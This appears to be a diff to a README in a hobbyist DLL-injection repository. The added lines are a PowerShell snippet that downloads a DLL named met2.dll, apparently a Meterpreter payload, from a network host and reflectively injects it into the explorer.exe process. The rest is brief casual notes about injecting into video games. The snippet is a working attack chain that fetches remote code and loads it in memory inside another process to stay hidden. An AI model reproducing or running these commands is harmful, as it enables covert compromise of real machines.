@@ -1,5 +1,12 @@
 # DLL-injection
 Summary: THIS IS LAME. WE WANT TO LOAD DLL FROM MEMORY
+with this:
+$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.244/met2.dll')
+$procid = (Get-Process -Name explorer).Id
+Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
+Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
+
+
 Rushed will goback and explain it better
 Usually fun with injecting into video games
 basic dll injection script 
